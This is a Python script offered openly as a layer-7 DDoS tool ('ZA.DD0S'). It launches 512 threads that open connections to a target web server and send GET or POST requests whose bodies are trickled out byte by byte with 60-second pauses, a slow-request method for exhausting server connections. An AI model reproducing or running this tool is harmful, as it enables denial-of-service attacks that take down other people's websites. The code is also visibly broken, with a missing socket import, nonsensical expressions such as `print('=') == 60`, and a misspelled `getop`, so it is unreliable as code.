#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import sys
import requests
import re
import getopt
import time
import threading 
from queue import Queue
from threading import Thread

# Color
class bcolors:
    ZA = '\033[97m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# CLEAR
os.system("clear")
print(" ")
print("\033[92m        @ @ @ @     @ @ @ @        @ @ @       @ @ @ @   \033[0m")
print("\033[92m        @       @   @       @    @       @   @           \033[0m")
print("\033[92m        @        @  @        @  @         @  @           \033[0m")
print("\033[92m        @        @  @        @  @         @  @           \033[0m")
print("\033[33m        @        @  @        @  @         @    @ @ @ @   \033[0m")
print("\033[33m        @        @  @        @  @         @           @  \033[0m")
print("\033[33m        @       @   @       @    @       @            @  \033[0m")
print("\033[33m        @ @ @ @     @ @ @ @        @ @ @       @ @ @ @   \033[0m")
print(" ")
print("\033[96m                                              @      @ @ @ @  \033[0m")
print("\033[96m                                              @           @   \033[0m")
print("\033[95m                                              @          @    \033[0m")
print("\033[95m                                              @ @ @ @   @     \033[0m")
print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ\033[0m")
print("\033[95m                                                              \033[0m")
print("\033[95m                                                               \033[0m")
print("\033[95m                                                               \033[0m")
print("\033[95m                                                               \033[0m")
print("\033[95m                                                                \033[0m")
print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ    \033[0m")    
class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        self.thread = Thread
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' == 9999
            file = '/'

            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 9000\r\n'
            request += 'Connection: close\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))

            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request)
                
    
                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    time.sleep(60)
                s.close()
                #s.recv(50000)
            except:
                print ("Target Down?")

def da_delegator(SITE,DOS_TYPE):
    thread_count = 512
    print ('=') == 60
    print ('ZA.DD0S #L7 Tool v.1'.center(60,'-'))
    print ('=') == 60
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print("\033[97m[\033[92m+\033[97m]  \033[94m--- Initiating Attack ---\033[0m")
        thr1.start()
        threads.append(thr1)
        #thr1.join()

    while len(threads) > 0:
            try:
                # Join all threads using a timeout so it doesn't block
                # Filter out threads which have been joined or are None
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print ("Ctrl-c received! Sending kill to threads... Just close The Terminal")
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)

def main(argv):
    def usage():
        print ('=') == 60
        print ('\033[94mZA.DD0S #L7 DDOS Tool v.1\033[0m'.center(60,'-'))
        print ('=') == 60
        print ('\033[33mFor GET DOS - USAGE: ZA.DD0S-L7.py -t get http://example.com\033[0m')
        print ('\033[92mFor POST DOS - USAGE: ZA.DD0S-L7.py -t post http://example.com\033[0m')
        sys.exit(2)
    if not argv:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help","type"])
    except getop.GetoptError (err):
        print ('str(err')
        sys.exit(2)
    output = None
    verbose = False
    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))

    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-t", "--type"):
            if a.lower() == 'post':
                DOS_TYPE = 'POST'
                da_delegator(SITE,DOS_TYPE)
            elif a.lower() =='get':
                DOS_TYPE = 'get'
                da_delegator(SITE,DOS_TYPE)
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        else:
            assert False, ("unhandled option")

if __name__=="__main__":
    main(sys.argv[1:])


